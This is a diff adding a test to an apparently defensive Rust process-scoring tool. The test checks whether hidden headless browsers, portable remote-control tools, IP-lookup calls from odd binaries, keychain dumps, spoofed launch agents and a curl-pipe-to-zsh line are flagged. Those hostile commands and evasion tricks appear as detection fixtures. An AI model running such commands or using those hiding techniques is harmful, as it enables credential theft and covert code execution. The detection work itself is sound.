@@ -5,7 +5,7 @@
 use garrett::agent::known_to;
 use garrett::linux::Snap;
 use garrett::parse::{Conn, Proc};
-use garrett::score::{bare_download, borrowed_name, risky_commands, score_process, user_writable, Remote, View};
+use garrett::score::{bare_download, borrowed_name, hidden_browser, risky_commands, score_process, user_writable, Remote, View};
 use garrett::watch::{Hands, Mode, Sensor, Watcher};
 use serde_json::{json, Value};
 use std::collections::HashMap;
@@ -357,4 +357,52 @@ fn an_account_is_told_apart_as_the_machines_own_or_a_persons() {
     // This test itself runs as someone: a person on a desk, the machine's own account on a build server.
     let own = account(std::process::id()).expect("this process's own account can be read");
     assert!(own.len() >= 12 && own[0] == 1 && own.len() == 8 + 4 * own[1] as usize, "{own:?}");
+}
+
+#[test]
+fn a_browser_nobody_can_see_a_helpdesk_tool_from_a_download_and_an_address_lookup_are_weighed() {
+    let stealer = "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --headless=new --disable-gpu --no-sandbox --disable-logging --window-position=-10000,-10000 --window-size=1,1";
+    assert!(hidden_browser(stealer));
+    assert!(hidden_browser("msedge.exe --user-data-dir=C:\\ProgramData\\e --load-extension=C:\\ProgramData\\x --headless=new"));
+    // One way of hiding is what test tools and scrapers do; the browser's own helpers repeat its switches.
+    for line in ["chrome.exe --headless=new --remote-debugging-port=0 --user-data-dir=C:\\Temp\\t", "chrome.exe --window-position=-32000,-32000", "chrome.exe --window-size=1,1",
+        "chrome.exe --load-extension=C:\\dev\\my-extension", "chrome.exe --type=renderer --headless=new --window-position=-10000,-10000", "chrome.exe https://example.com"] {
+        assert!(!hidden_browser(line), "{line}");
+    }
+    let mut chrome = windows("chrome.exe", "runtime.exe", stealer);
+    chrome.path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe".into();
+    chrome.signature = Some(("signed".into(), "Google LLC".into()));
+    let (level, signals) = judged(&chrome);
+    assert_eq!((level.as_str(), signals.as_slice()), ("SUSPECT", &["hidden_browser".to_string()][..]));
+    chrome.cmdline = Some("chrome.exe https://example.com".into());
+    assert_eq!(judged(&chrome).0, "CLEAR");
+
+    let portable = View { name: "AnyDesk.exe".into(), path: "C:\\Users\\sam\\Downloads\\AnyDesk.exe".into(), parent_name: "explorer.exe".into(), system: "windows".into(),
+        signature: Some(("signed".into(), "AnyDesk Software GmbH".into())), file_age: Some(200.0), ..View::default() };
+    let (level, signals) = judged(&portable);
+    assert!(signals.contains(&"remote_control_tool".to_string()), "{signals:?}");
+    assert_eq!(level, "SUSPECT", "a remote-control tool that arrived minutes ago and runs from a download folder");
+    let installed = View { path: "C:\\Program Files (x86)\\AnyDesk\\AnyDesk.exe".into(), file_age: None, ..portable.clone() };
+    assert_eq!(judged(&installed), ("CLEAR".to_string(), Vec::new()), "installed by its owner");
+    let old_download = View { file_age: Some(86400.0 * 30.0), ..portable };
+    assert_ne!(judged(&old_download).0, "SUSPECT", "one that has been there for a month is not news");
+
+    let mut bot = linux("kworkerd", "/var/tmp/kworkerd", "sh", "/var/tmp/kworkerd");
+    bot.remotes = vec![Remote { address: "93.184.216.34".into(), port: 443, names: vec!["api.ipify.org".into()] }];
+    assert!(judged(&bot).1.contains(&"address_lookup_host".to_string()));
+    let mut updater = linux("ddclient", "/usr/bin/ddclient", "systemd", "ddclient");
+    updater.remotes = bot.remotes.clone();
+    assert!(!judged(&updater).1.contains(&"address_lookup_host".to_string()), "an installed program may ask");
+
+    let labels = |line: &str| -> Vec<&'static str> { risky_commands().iter().filter(|(pattern, _)| pattern.is_match(line)).map(|(_, label)| *label).collect() };
+    assert!(labels("security dump-keychain -d login.keychain").contains(&"the keychain copied out from a command line"));
+    assert!(labels("security find-certificate -a").is_empty());
+    assert!(labels("nvme fw-download /dev/nvme0 --fw=/tmp/f.bin").contains(&"firmware written to a storage drive"));
+    assert!(labels("nvme list").is_empty());
+    let keystone = "<key>Label</key><string>com.google.keystone.agent</string><array><string>/Users/sam/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate</string></array>";
+    assert!(borrowed_name("/Users/sam/Library/LaunchAgents/com.google.keystone.agent.plist", keystone));
+    assert!(!borrowed_name("/Users/sam/Library/LaunchAgents/com.google.keystone.agent.plist", &keystone.replace("Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate", "Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent")));
+    let editor = View { name: "zsh".into(), path: "/bin/zsh".into(), parent_name: "Script Editor".into(), system: "macos".into(), cmdline: Some("zsh -c curl -s https://example.com/a | zsh".into()), ..View::default() };
+    let (level, signals) = judged(&editor);
+    assert!(signals.contains(&"script_from_document".to_string()) && level == "SUSPECT", "{signals:?}");
 }
